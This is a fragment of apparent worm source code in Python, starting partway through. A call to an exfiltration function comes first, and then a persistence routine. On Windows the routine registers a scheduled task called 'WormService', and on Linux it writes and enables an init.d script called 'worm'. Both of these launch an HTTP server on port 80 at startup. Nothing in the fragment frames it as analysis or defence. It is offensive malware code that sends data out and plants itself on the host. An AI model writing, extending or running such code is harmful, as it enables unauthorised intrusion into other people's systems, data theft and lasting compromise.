    exfiltrate_data(exfiltration_url, data_to_exfiltrate)
    
    # Step 3: Establish persistence
    def create_persistence():
        system = platform.system()
        if system == "Windows":
            service_name = "WormService"
            command = f'schtasks /create /tn {service_name} /tr "cmd /c pythonw -c import os; os.system(\'pythonw -m http.server 80\')" /sc onlogon'
            os.system(command)
        elif system == "Linux":
            service_name = "worm"
            with open(f"/etc/init.d/{service_name}", "w") as f:
                f.write("#!/bin/bash\npython3 -m http.server 80 &")
            os.system(f"chmod +x /etc/init.d/{service_name}")
            os.system(f"update-rc.d {service_name} defaults")
    
    create_persistence()
